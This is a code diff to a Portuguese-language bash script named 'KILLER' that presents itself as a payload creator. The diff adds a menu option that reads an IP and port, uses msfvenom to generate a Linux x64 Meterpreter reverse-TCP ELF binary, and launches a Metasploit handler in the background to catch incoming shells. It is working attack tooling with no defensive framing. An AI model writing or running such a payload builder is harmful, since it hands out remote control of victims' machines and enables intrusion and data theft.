@@ -84,7 +84,7 @@ clear
 
 figlet         OPTIONS
 echo -e "${WHITE}       CRIADOR DE PAYLOAD(ESCOLHA POR NUMERO) "
-echo -e "${RED}[-]OPCAO 4 E 5 NAO ESTA FUCIONANDO NO MOMENTO[-]"
+echo -e "${RED}[-]OPCAO 4  NAO ESTA FUCIONANDO NO MOMENTO[-]"
 echo -e "${RED}   _________________________________________             "
 echo "  |    REDES          |   SISTEMAS  |    VERSION  |                                     "
 echo "  |___________________|_____________|_____________| "
@@ -238,8 +238,30 @@ msfconsole -q -x "use multi/handler ; set PAYLOAD $PAYLOAD ; set LHOST $lhost ; 
 exit 0
 
 
-fi
+
+
+elif [ $rap -eq "5" ]
+then
 clear
+cd arquivos
+PAYLOAD='linux/x64/meterpreter/reverse_tcp'
+
+echo "DIGITE O IP INTERNO "
+echo -e " ┌─["${RED}"KILLER]──[${RED}~]─["$CYAN"menu]:"
+      echo -ne  " └─────► "
+     read lhost
+
+echo "DIGITE A PORTA "
+echo -e " ┌─["${RED}"KILLER]──[${RED}~]─["$CYAN"menu]:"
+      echo -ne  " └─────► "
+     read lport
+
+
+
+
+echo "CRIANDO PAYLOAD, AGUARDE.." ; msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=$lhost LPORT=$lport -f elf  > bin  2>/dev/null
+
+
 echo "ARQUIVO CRIADO COM SUCESSO. DESEJA CONFIGURAR O HANDLER OU IR SAIR? n\y" && read hand
 clear
 if [ $hand == "y" ]
@@ -250,7 +272,7 @@ echo "            PAYLOADS SALVO EM ARQUIVOS"
 echo "           ABRINDO O METASPLOIT...  "
 echo "-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-="
 sleep 0.2
-msfconsole -q -x "use multi/handler ; set PAYLOAD $PAYLOAD ; set LHOST $lhost ; set LPORT $lport ; exploit" 
+msfconsole -q -x "use multi/handler ; set payload $PAYLOAD ; set LHOST $lhost ; set LPORT $lport ; exploit -j " 
 
 elif [ $hand == "n" ]
 then
@@ -265,4 +287,5 @@ fi
 if [ $rap -eq "6" ]
 then
 exit 0
+fi
 fi
